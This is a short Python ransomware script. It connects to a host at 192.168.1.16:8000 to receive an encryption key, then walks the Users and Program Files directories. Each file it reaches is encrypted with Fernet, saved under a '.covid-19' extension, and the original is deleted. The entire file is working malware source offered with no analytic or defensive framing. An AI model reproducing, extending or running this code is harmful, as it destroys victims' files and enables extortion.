#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
import os, sys, socket, wget, struct, ctypes, shutil, time, winreg

#START THE SOCKET SERVER
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.1.16", 8000))
enter = "[!] Transfert the key and the password :\n "
exit = "\n[!] Transfert [OK]"
sock.send(enter.encode())
print(sock.recv(2048).decode())
key = sock.recv(2048)
print(key)
sock.send(exit.encode())
sock.close()

#FILE ENCYPTING FUNCTION
def file_ecrypt(key, name):
    if (name!="Ransomware.py"):
        with open(name,'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        encrypted_file = name + ".covid-19"
        try:
            with open(encrypted_file, 'wb') as f:
                f.write(encrypted)

            os.remove(name)
        except:
            print("Error: Not Permitted")

#LIST ALL FILES EXTENTIONS AND INVOKE ENCRYPTION FUNCTION
def filelist():
    spec = ['/users/', '/Program Files (x86)/', '/Program Files/']
    for i in spec:
        for root, dirs, files in os.walk(i):
            for file in files:
                for ext in file.split("."):
                    try:
                        if file.endswith(ext):
                            ally = os.path.join(root, file)
                            print(ally)
                            file_ecrypt(key, ally)
                    except PermissionError:
                        pass
filelist()
